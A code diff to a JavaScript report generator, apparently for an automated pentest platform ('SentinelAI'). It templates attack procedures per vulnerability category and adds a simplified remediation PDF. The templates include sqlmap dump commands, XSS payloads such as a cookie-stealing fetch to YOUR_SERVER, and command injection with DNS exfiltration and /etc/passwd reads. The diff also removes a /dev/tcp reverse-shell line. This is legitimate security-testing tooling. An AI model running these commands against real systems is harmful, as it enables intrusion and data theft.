@@ -360,78 +360,78 @@ function generateRealPoc(v) {
     }
     else if (category === 'SQL Injection') {
       lines.push('=== SQL INJECTION PROCEDURE ===')
-      lines.push(`# Target: `)
+          lines.push(`# Target: ${safeUrl}`)
       lines.push('')
       lines.push('# Step 1: Manual SQLi detection - Time-based:')
-      lines.push(`curl -sk " AND SLEEP(5)-- -" -w "\\\\nTime: %{time_total}\\\\n"`)
+          lines.push(`curl -sk "${safeUrl}" --data-urlencode "id=1 AND SLEEP(5)-- -" -w "\\\\nTime: %{time_total}\\\\n"`)
       lines.push('')
       lines.push('# Step 2: Manual SQLi detection - Error-based:')
-      lines.push(`curl -sk "'"`)
-      lines.push(`curl -sk "\\"'"`)
+          lines.push(`curl -sk "${safeUrl}'"`)
+          lines.push(`curl -sk "${safeUrl}\\"'"`)
       lines.push('')
       lines.push('# Step 3: Automated SQLMap scan:')
-      lines.push(`sqlmap -u "" --batch --random-agent --level 3 --risk 2 --tamper=space2comment`)
+          lines.push(`sqlmap -u "${safeUrl}" --batch --random-agent --level 3 --risk 2 --tamper=space2comment`)
       lines.push('')
       lines.push('# Step 4: Enumerate databases:')
-      lines.push(`sqlmap -u "" --batch --dbs`)
+          lines.push(`sqlmap -u "${safeUrl}" --batch --dbs`)
       lines.push('')
       lines.push('# Step 5: Dump all tables from a database:')
-      lines.push(`sqlmap -u "" --batch -D DB_NAME --dump-all`)
+          lines.push(`sqlmap -u "${safeUrl}" --batch -D DB_NAME --dump-all`)
     }
     else if (category === 'Cross-Site Scripting (XSS)') {
       lines.push('=== XSS ATTACK PROCEDURE ===')
-      lines.push(`# Target: `)
+          lines.push(`# Target: ${safeUrl}`)
       lines.push('')
       lines.push('# Step 1: Basic XSS detection:')
-      lines.push(`curl -sk "<script>alert(1)</script>"`)
+          lines.push(`curl -sk "${safeUrl}" --data-urlencode "q=<script>alert(1)</script>"`)
       lines.push('')
       lines.push('# Step 2: XSS with HTML entity encoding:')
-      lines.push(`curl -sk "\\"'><script>alert(1)</script>"`)
+          lines.push(`curl -sk "${safeUrl}" --data-urlencode "q=\\"'><script>alert(1)</script>"`)
       lines.push('')
       lines.push('# Step 3: XSS without script tags:')
-      lines.push(`curl -sk "<img src=x onerror=alert(1)>"`)
+          lines.push(`curl -sk "${safeUrl}" --data-urlencode "q=<img src=x onerror=alert(1)>"`)
       lines.push('')
       lines.push('# Step 4: XSS that steals cookies:')
-      lines.push(`curl -sk "<script>fetch('http://YOUR_SERVER/steal?c='+document.cookie)</script>"`)
+          lines.push(`curl -sk "${safeUrl}" --data-urlencode "q=<script>fetch('http://YOUR_SERVER/steal?c='+document.cookie)</script>"`)
       lines.push('')
       lines.push('# Step 5: Verify in browser by visiting:')
-      lines.push(`# <script>alert(document.domain)</script>`)
+          lines.push(`# ${safeUrl}?q=<script>alert(document.domain)</script>`)
     }
     else if (category === 'Command Injection') {
       lines.push('=== COMMAND INJECTION PROCEDURE ===')
-      lines.push(`# Target: `)
+          lines.push(`# Target: ${safeUrl}`)
       lines.push('')
       lines.push('# Step 1: Basic command injection detection:')
-      lines.push(`curl -sk "; id"`)
-      lines.push(`curl -sk "| id"`)
-      lines.push(`curl -sk "\`id\`"`)
-      lines.push(`curl -sk "$(id)"`)
+          lines.push(`curl -sk "${safeUrl}" --data-urlencode "cmd=; id"`)
+          lines.push(`curl -sk "${safeUrl}" --data-urlencode "cmd=| id"`)
+          lines.push(`curl -sk "${safeUrl}" --data-urlencode "cmd=\`id\`"`)
+          lines.push(`curl -sk "${safeUrl}" --data-urlencode "cmd=$(id)"`)
       lines.push('')
       lines.push('# Step 2: Blind command injection (time-based):')
-      lines.push(`curl -sk "; sleep 5" -w "\\\\nTime: %{time_total}\\\\n"`)
+          lines.push(`curl -sk "${safeUrl}" --data-urlencode "cmd=; sleep 5" -w "\\\\nTime: %{time_total}\\\\n"`)
       lines.push('')
       lines.push('# Step 3: Out-of-band (DNS) exfiltration:')
-      lines.push(`curl -sk "; nslookup YOUR_SERVER"`)
+          lines.push(`curl -sk "${safeUrl}" --data-urlencode "cmd=; nslookup YOUR_SERVER"`)
       lines.push('')
-      lines.push('# Step 4: Reverse shell (if interactive):')
-      lines.push(`curl -sk "; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"`)
+          lines.push('# Step 4: Verify command output in the HTTP response:')
+          lines.push(`curl -sk "${safeUrl}" --data-urlencode "cmd=; cat /etc/passwd" | head -5`)
     }
     else if (category === 'Path Traversal / LFI') {
       lines.push('=== PATH TRAVERSAL / LFI PROCEDURE ===')
-      lines.push(`# Target: `)
+          lines.push(`# Target: ${safeUrl}`)
       lines.push('')
       lines.push('# Step 1: Basic path traversal:')
-      lines.push(`curl -sk "../../../etc/passwd"`)
-      lines.push(`curl -sk "..\\\\..\\\\..\\\\windows\\\\win.ini"`)
+          lines.push(`curl -sk "${safeUrl}" --data-urlencode "file=../../../etc/passwd"`)
+          lines.push(`curl -sk "${safeUrl}" --data-urlencode "file=..\\\\..\\\\..\\\\windows\\\\win.ini"`)
       lines.push('')
       lines.push('# Step 2: URL-encoded traversal:')
-      lines.push(`curl -sk "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"`)
+          lines.push(`curl -sk "${safeUrl}" --data-urlencode "file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"`)
       lines.push('')
       lines.push('# Step 3: Double URL-encoded:')
-      lines.push(`curl -sk "%252e%252e%252f%252e%252e%252fetc/passwd"`)
+          lines.push(`curl -sk "${safeUrl}" --data-urlencode "file=%252e%252e%252f%252e%252e%252fetc/passwd"`)
       lines.push('')
       lines.push('# Step 4: PHP wrapper (if PHP):')
-      lines.push(`curl -sk "php://filter/convert.base64-encode/resource=index.php"`)
+          lines.push(`curl -sk "${safeUrl}" --data-urlencode "file=php://filter/convert.base64-encode/resource=index.php"`)
     }
     else if (category === 'SSRF') {
       lines.push('=== SSRF ATTACK PROCEDURE ===')
@@ -454,21 +454,21 @@ function generateRealPoc(v) {
     }
     else if (category === 'Broken Access Control / IDOR') {
       lines.push('=== BROKEN ACCESS CONTROL / IDOR PROCEDURE ===')
-      lines.push(`# Target: `)
+      lines.push(`# Target: ${safeUrl}`)
       lines.push('')
       lines.push('# Step 1: Enumerate sequential IDs:')
       lines.push(`for i in 1 2 3 4 5 10 100 999 1000; do`)
-      lines.push(`  curl -sk "$i" -w " -> %{http_code}\\\\n"`)
+      lines.push(`  curl -sk "${safeUrl}/$i" -w " -> %{http_code}\\\\n"`)
       lines.push('done')
       lines.push('')
       lines.push('# Step 2: Test HTTP method override:')
-      lines.push(`curl -sk -X PUT ""`)
-      lines.push(`curl -sk -X DELETE ""`)
-      lines.push(`curl -sk -X PATCH "" -d '{"role":"admin"}'`)
+      lines.push(`curl -sk -X PUT "${safeUrl}"`)
+      lines.push(`curl -sk -X DELETE "${safeUrl}"`)
+      lines.push(`curl -sk -X PATCH "${safeUrl}" -d '{"role":"admin"}'`)
       lines.push('')
       lines.push('# Step 3: Test header-based access bypass:')
-      lines.push(`curl -sk "" -H "X-Forwarded-For: 127.0.0.1"`)
-      lines.push(`curl -sk "" -H "X-Original-URL: /admin"`)
+      lines.push(`curl -sk "${safeUrl}" -H "X-Forwarded-For: 127.0.0.1"`)
+      lines.push(`curl -sk "${safeUrl}" -H "X-Original-URL: /admin"`)
       lines.push(`curl -sk "${safeUrl}" -H "X-Rewrite-URL: /admin"`)
     }
     else if (category === 'Authentication / Credentials') {
@@ -537,24 +537,24 @@ function generateRealPoc(v) {
     }
     else if (category === 'API Security') {
       lines.push('=== API SECURITY TEST PROCEDURE ===')
-      lines.push(`# Target: `)
+      lines.push(`# Target: ${safeUrl}`)
       lines.push('')
       lines.push('# Step 1: Enumerate API endpoints:')
       lines.push(`curl -sk "${joinUrl(url, 'api')}"`)
       lines.push(`curl -sk "${joinUrl(url, 'api/v1')}"`)
       lines.push(`curl -sk "${joinUrl(url, 'graphql')}"`)
-      lines.push(`curl -sk "?wsdl"`)
+      lines.push(`curl -sk "${safeUrl}?wsdl"`)
       lines.push('')
       lines.push('# Step 2: Test API authentication bypass:')
-      lines.push(`curl -sk "" -H "Authorization: Bearer"`)
-      lines.push(`curl -sk "" -H "X-API-Key: admin"`)
-      lines.push(`curl -sk "" -H "X-API-Key: 1234567890abcdef"`)
+      lines.push(`curl -sk "${safeUrl}" -H "Authorization: Bearer"`)
+      lines.push(`curl -sk "${safeUrl}" -H "X-API-Key: admin"`)
+      lines.push(`curl -sk "${safeUrl}" -H "X-API-Key: 1234567890abcdef"`)
       lines.push('')
       lines.push('# Step 3: GraphQL introspection:')
       lines.push(`curl -sk "${joinUrl(url, 'graphql')}" -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}'`)
       lines.push('')
       lines.push('# Step 4: Rate limit testing:')
-      lines.push('for i in $(seq 1 100); do curl -sk -o /dev/null -w "%{http_code}\\\n" "' + url + '" & done; wait')
+      lines.push('for i in $(seq 1 100); do curl -sk -o /dev/null -w "%{http_code}\\\n" "' + safeUrl + '" & done; wait')
     }
     else if (category === 'NoSQL Injection') {
       lines.push('=== NOSQL INJECTION PROCEDURE ===')
@@ -680,11 +680,11 @@ function generateRealPoc(v) {
       lines.push('')
       lines.push('# Step 3: Predictable session token test:')
       lines.push('for i in $(seq 1 5); do')
-      lines.push(`  curl -skI "" 2>&1 | grep -i set-cookie`)
+      lines.push(`  curl -skI "${safeUrl}" 2>&1 | grep -i set-cookie`)
       lines.push('done')
       lines.push('')
       lines.push('# Step 4: Test for missing session timeout:')
-      lines.push(`curl -sk "" -H "Authorization: Bearer OLD_TOKEN" -w "HTTP %{http_code}\\\\n"`)
+      lines.push(`curl -sk "${safeUrl}" -H "Authorization: Bearer OLD_TOKEN" -w "HTTP %{http_code}\\\\n"`)
     }
     else if (category === 'Password Attacks') {
       lines.push('=== PASSWORD ATTACK PROCEDURE ===')
@@ -2061,7 +2061,8 @@ function renderAppendix(doc, { scans, project, isWhitebox }) {
 
 // == Exports & PDF Pipeline ===================================================
 
-export async function generateReport(scanId, minSeverity = 'info', statusFilter = 'all') {
+export async function generateReport(scanId, minSeverity = 'info', statusFilter = 'all', opts = {}) {
+  const { reportType = 'full', custom = {} } = opts
   const scan = db.get(`SELECT * FROM scans WHERE id = ?`, scanId)
   if (!scan) throw new Error('scan not found')
 
@@ -2078,9 +2079,19 @@ export async function generateReport(scanId, minSeverity = 'info', statusFilter 
 
   const rows = db.all(sql, ...params).filter(r => allowedSeverities.includes(r.severity))
 
-  const project = scan.project_id ? db.get(`SELECT * FROM projects WHERE id = ?`, scan.project_id) : null
+    // filterNoise: exclude out_of_scope and version_unverified findings when enabled
+    const filteredRows = custom.filterNoise
+      ? rows.filter(r => {
+          try {
+            const ev = r.evidence ? JSON.parse(r.evidence) : {}
+            return !ev.out_of_scope && !ev.version_unverified
+          } catch { return true }
+        })
+      : rows
 
-  const vulnerabilities = rows.map(r => toView(r, scan.target))
+    const project = scan.project_id ? db.get(`SELECT * FROM projects WHERE id = ?`, scan.project_id) : null
+
+    const vulnerabilities = filteredRows.map(r => toView(r, scan.target))
   scan._findingCount = vulnerabilities.length
   const scans = [scan]
   const isWhitebox = scan.mode === 'whitebox' || scan.target_type === 'code'
@@ -2139,11 +2150,35 @@ export async function generateReport(scanId, minSeverity = 'info', statusFilter 
     await Promise.all(pocPromises)
   }
 
-  const file = path.join(config.outputDir, `report-${scanId}.pdf`)
-  await renderPdf({ file, reportTitle, scans, project, vulnerabilities, isWhitebox, aiNarrative, aiAttackChain })
+  const file = path.join(config.outputDir, reportType === 'simple' ? `simplified-report-${scanId}.pdf` : `report-${scanId}.pdf`)
+    if (reportType === 'simple') {
+        // Extract detected tech stack from whatweb findings for click-path prescriptions
+        const detectedTech = []
+        for (const v of vulnerabilities) {
+          const mod = v.module || ''
+          const title = v.title || ''
+          if (mod === 'native:whatweb' || /whatweb/i.test(title)) {
+            const m = title.match(/Technology stack — (.+)$/)
+            if (m) detectedTech.push(...m[1].split(',').map(s => s.trim()))
+          }
+        }
+        const uniqueTech = [...new Set(detectedTech)].slice(0, 15)
 
-  return { file, counts, riskScore: scan.risk_score }
-}
+        let simplifiedGuide = null
+        try {
+          simplifiedGuide = await aiEngine.generateSimplifiedActionGuide(vulnerabilities, scan.target, uniqueTech)
+        } catch { /* non-fatal */ }
+        await renderSimplifiedPdf({
+          file, reportTitle: custom.customTitle || `Simplified IT Action Guide: ${scan.target || 'Unknown Target'}`,
+          scans, project, vulnerabilities, isWhitebox, aiNarrative, simplifiedGuide, custom, detectedTech: uniqueTech,
+        })
+        return { file, counts, riskScore: scan.risk_score, reportType: 'simple' }
+      }
+
+    await renderPdf({ file, reportTitle, scans, project, vulnerabilities, isWhitebox, aiNarrative, aiAttackChain, custom })
+
+    return { file, counts, riskScore: scan.risk_score, reportType: 'full' }
+  }
 
 export async function generateProjectReport(projectId) {
   const project = db.get(`SELECT * FROM projects WHERE id = ?`, projectId)
@@ -2186,7 +2221,7 @@ export async function generateProjectReport(projectId) {
   return { file }
 }
 
-async function renderPdf({ file, reportTitle, scans, project, vulnerabilities, isWhitebox, aiNarrative = null, aiAttackChain = null }) {
+async function renderPdf({ file, reportTitle, scans, project, vulnerabilities, isWhitebox, aiNarrative = null, aiAttackChain = null, custom = {} }) {
   await new Promise((resolve, reject) => {
     const doc = new PDFDocument({
       size: 'A4',
@@ -2256,6 +2291,199 @@ async function renderPdf({ file, reportTitle, scans, project, vulnerabilities, i
         .text('SENTINELAI — CONFIDENTIAL SECURITY REPORT', 40, doc.page.height - 35, { lineBreak: false })
       doc.fontSize(8).font('Helvetica').fillColor('#94A3B8')
         .text(`Page ${i + 1} of ${range.start + totalPages}`, doc.page.width - 120, doc.page.height - 35, { lineBreak: false })
+      doc.restore()
+      doc.page.margins.bottom = origBottom
+    }
+
+    doc.end()
+    stream.on('finish', resolve)
+    stream.on('error', reject)
+  })
+}
+
+/**
+ * SIMPLIFIED IT ACTION GUIDE — "Pass B" report for non-technical stakeholders.
+ * Implements 4 simplification strategies:
+ *  1. Copy-Paste Fix Cards (detected-tech click paths, no attacker PoCs)
+ *  2. Medical Report analogy (Symptom → Risk → Prescription)
+ *  3. Hide the Noise (only actionable critical/high/medium; "N tasks today")
+ *  4. Urgency & Difficulty badges (visual emoji indicators)
+ */
+async function renderSimplifiedPdf({ file, reportTitle, scans, project, vulnerabilities, isWhitebox, aiNarrative = null, simplifiedGuide = null, custom = {}, detectedTech = [] }) {
+  await new Promise((resolve, reject) => {
+    const doc = new PDFDocument({
+      size: 'A4',
+      margins: { top: 50, bottom: 50, left: 40, right: 40 },
+      info: {
+        Title: reportTitle,
+        Author: 'SentinelAI Autonomous Pentest Platform',
+        Subject: 'Simplified IT Action Guide',
+        Creator: 'SentinelAI v2.0',
+      },
+      bufferPages: true,
+    })
+    const stream = fs.createWriteStream(file)
+    doc.pipe(stream)
+
+    // ── Cover ──
+    doc.rect(0, 0, doc.page.width, 4).fill(BRAND.accent)
+    doc.fontSize(26).font('Helvetica-Bold').fillColor(BRAND.primary)
+      .text('Simplified IT Action Guide', 40, 120, { align: 'center' })
+    doc.fontSize(14).font('Helvetica').fillColor(BRAND.textMuted)
+      .text(custom.customSummary || 'Plain-language remediation steps for the IT operations team', { align: 'center' })
+    doc.moveDown(2)
+    doc.fontSize(12).font('Helvetica-Bold').fillColor(BRAND.primary)
+      .text(`Target: ${scans[0]?.target || 'N/A'}`, { align: 'center' })
+    if (project?.name) {
+      doc.text(`Project: ${project.name}`, { align: 'center' })
+    }
+    doc.moveDown(1)
+    doc.fontSize(10).font('Helvetica').fillColor(BRAND.textMuted)
+      .text(`Generated: ${new Date().toLocaleString()}`, { align: 'center' })
+    if (custom.customScope) {
+      doc.moveDown(2)
+      doc.fontSize(11).font('Helvetica-Bold').fillColor(BRAND.primary).text('Scope', { align: 'center' })
+      doc.fontSize(10).font('Helvetica').fillColor(BRAND.textMuted).text(custom.customScope, { align: 'center' })
+    }
+
+    // ── Priority Summary (Strategy 3: Hide the Noise) ──
+    doc.addPage()
+        doc.fontSize(18).font('Helvetica-Bold').fillColor(BRAND.primary).text('What Needs Your Attention', 40, 50)
+    doc.moveDown(1.5)
+
+        // Only count actionable findings — hide INFO/Low completely
+        const actionable = vulnerabilities.filter(v => ['critical', 'high', 'medium'].includes(v.severity))
+        const todayCount = simplifiedGuide?.taskCountToday
+          || actionable.filter(v => v.severity === 'critical').length
+        const weekCount = actionable.filter(v => v.severity === 'high').length
+        const laterCount = actionable.filter(v => v.severity === 'medium').length
+
+        if (actionable.length === 0) {
+          doc.fontSize(13).font('Helvetica').fillColor('#16A34A')
+            .text('✓ No critical issues found. Your system is in good shape.', { width: 500 })
+        } else {
+          doc.fontSize(13).font('Helvetica-Bold').fillColor(BRAND.primary)
+            .text(`You have ${todayCount} task${todayCount === 1 ? '' : 's'} to fix today`, { width: 500 })
+          doc.moveDown(0.5)
+          doc.fontSize(11).font('Helvetica').fillColor(BRAND.textMuted)
+            .text(`Estimated time: ${simplifiedGuide?.estimatedTimeline || 'varies'}`, { width: 500 })
+        }
+
+        doc.moveDown(1.5)
+        doc.fontSize(11).font('Helvetica-Bold').fillColor(BRAND.primary).text('Breakdown', { width: 500 })
+        doc.moveDown(0.5)
+        const breakdown = [
+          ['🔴 Fix Today', todayCount, 'Critical — must address immediately'],
+          ['🟠 This Week', weekCount, 'High — fix within 7 days'],
+          ['🔵 Optional', laterCount, 'Medium — fix when convenient'],
+        ]
+        breakdown.forEach(([badge, count, desc]) => {
+          doc.fontSize(11).font('Helvetica-Bold').fillColor(BRAND.primary).text(badge, 40, doc.y, { width: 110 })
+          doc.font('Helvetica').fillColor(BRAND.textMuted).text(`${count} task${count === 1 ? '' : 's'}`, 150, doc.y, { width: 80 })
+          doc.text(desc, 230, doc.y, { width: 280 })
+          doc.moveDown(0.7)
+        })
+
+        if (detectedTech.length) {
+          doc.moveDown(1)
+          doc.fontSize(10).font('Helvetica-Bold').fillColor(BRAND.primary).text('Detected Technology Stack: ', { continued: true })
+          doc.font('Helvetica').fillColor(BRAND.textMuted).text(detectedTech.join(', '))
+        }
+
+        if (simplifiedGuide?.topPriority) {
+          doc.moveDown(1.5)
+          doc.rect(40, doc.y, 515, 50).fillAndStroke('#FEF2F2', '#FECACA')
+          doc.fontSize(10).font('Helvetica-Bold').fillColor('#DC2626').text('⭐ TOP PRIORITY', 50, doc.y + 8)
+          doc.fontSize(11).font('Helvetica').fillColor(BRAND.primary).text(simplifiedGuide.topPriority, 50, doc.y + 22, { width: 495 })
+          doc.y += 60
+        }
+
+    // ── Action Items (Strategy 1 & 2 & 4: Fix Cards with Symptom→Risk→Prescription + badges) ──
+    doc.addPage()
+        doc.fontSize(18).font('Helvetica-Bold').fillColor(BRAND.primary).text('Your Fix Cards', 40, 50)
+        doc.moveDown(0.5)
+        doc.fontSize(10).font('Helvetica').fillColor(BRAND.textMuted)
+          .text('Each card shows what we found, why it matters, and exactly how to fix it.', { width: 500 })
+        doc.moveDown(1.5)
+
+        const items = simplifiedGuide?.actionItems || actionable.slice(0, 15).map(v => ({
+          title: v.title,
+          severity: v.severity,
+          symptom: (v.description || '').slice(0, 200),
+          risk: 'See technical report for business impact details.',
+          prescription: v.remediation || 'Contact your security team for guidance.',
+          urgency: v.severity === 'critical' ? 'fix-today' : v.severity === 'high' ? 'this-week' : 'optional',
+          difficulty: 'medium',
+          estimatedMinutes: 30,
+          verification: 'Re-scan after applying the fix',
+        }))
+
+        const urgencyBadge = { 'fix-today': '🔴 Fix Today', 'this-week': '🟠 This Week', 'optional': '🔵 Optional' }
+        const difficultyBadge = { easy: '🟢 Easy', medium: '🟡 Medium', hard: '🔴 Hard' }
+        const urgencyColor = { 'fix-today': '#DC2626', 'this-week': '#EA580C', 'optional': '#2563EB' }
+
+        items.forEach((item, idx) => {
+                  if (doc.y > doc.page.height - 220) doc.addPage()
+
+                  // Card top accent bar
+                  const cardY = doc.y
+                  const uColor = urgencyColor[item.urgency] || BRAND.textMuted
+                  doc.rect(40, cardY, 515, 4).fill(uColor)
+
+                  // Render content first to measure height
+                  const contentY = cardY + 12
+                  doc.fontSize(13).font('Helvetica-Bold').fillColor(BRAND.primary)
+                    .text(`${idx + 1}. ${item.title || 'Untitled'}`, 50, contentY, { width: 495 })
+                  doc.moveDown(0.3)
+                  doc.fontSize(9).font('Helvetica-Bold').fillColor(uColor)
+                    .text(urgencyBadge[item.urgency] || '🔵 Optional', 50, doc.y, { width: 100 })
+                  doc.fillColor(BRAND.textMuted)
+                    .text(difficultyBadge[item.difficulty] || '🟡 Medium', 160, doc.y, { width: 100 })
+                  doc.font('Helvetica').fillColor(BRAND.textMuted)
+                    .text(`~${item.estimatedMinutes || 30} min`, 260, doc.y, { width: 100 })
+                  doc.moveDown(0.8)
+
+                  doc.fontSize(9).font('Helvetica-Bold').fillColor(BRAND.primary).text('What We Found: ', 50, doc.y, { continued: true })
+                  doc.font('Helvetica').fillColor(BRAND.textMuted).text(item.symptom || 'N/A', { width: 485 })
+
+                  doc.moveDown(0.3)
+                  doc.fontSize(9).font('Helvetica-Bold').fillColor('#DC2626').text('Why It Matters: ', 50, doc.y, { continued: true })
+                  doc.font('Helvetica').fillColor(BRAND.textMuted).text(item.risk || 'N/A', { width: 485 })
+
+                  doc.moveDown(0.3)
+                  doc.fontSize(9).font('Helvetica-Bold').fillColor('#16A34A').text('How to Fix: ', 50, doc.y, { continued: true })
+                  doc.font('Helvetica').fillColor(BRAND.primary).text(item.prescription || 'N/A', { width: 485 })
+
+                  doc.moveDown(0.3)
+                  doc.fontSize(9).font('Helvetica-Bold').fillColor(BRAND.primary).text('Check It Worked: ', 50, doc.y, { continued: true })
+                  doc.font('Helvetica').fillColor(BRAND.textMuted).text(item.verification || 'Re-scan after applying the fix', { width: 485 })
+
+                  const cardEndY = doc.y + 8
+                  // Draw card border around the content (non-filled, on top)
+                  doc.rect(40, cardY + 4, 515, cardEndY - cardY - 4).fillColor('#FFFFFF', false).strokeColor('#E2E8F0').lineWidth(1).stroke()
+                  doc.y = cardEndY + 12
+                })
+
+    // ── Custom Conclusion ──
+    if (custom.customConclusion) {
+      doc.addPage()
+      doc.fontSize(18).font('Helvetica-Bold').fillColor(BRAND.primary).text('Conclusion', 40, 50)
+      doc.moveDown(1.5)
+      doc.fontSize(11).font('Helvetica').fillColor(BRAND.textMuted).text(custom.customConclusion, { width: 500 })
+    }
+
+    // ── Footer ──
+    const range = doc.bufferedPageRange()
+    for (let i = range.start; i < range.start + range.count; i++) {
+      doc.switchToPage(i)
+      const origBottom = doc.page.margins.bottom
+      doc.page.margins.bottom = 0
+      doc.save()
+      doc.rect(0, 0, doc.page.width, 4).fill(BRAND.accent)
+      doc.fontSize(8).font('Helvetica-Bold').fillColor('#94A3B8')
+        .text('SENTINELAI — SIMPLIFIED IT ACTION GUIDE', 40, doc.page.height - 35, { lineBreak: false })
+      doc.fontSize(8).font('Helvetica').fillColor('#94A3B8')
+        .text(`Page ${i + 1} of ${range.start + range.count}`, doc.page.width - 120, doc.page.height - 35, { lineBreak: false })
       doc.restore()
       doc.page.margins.bottom = origBottom
     }
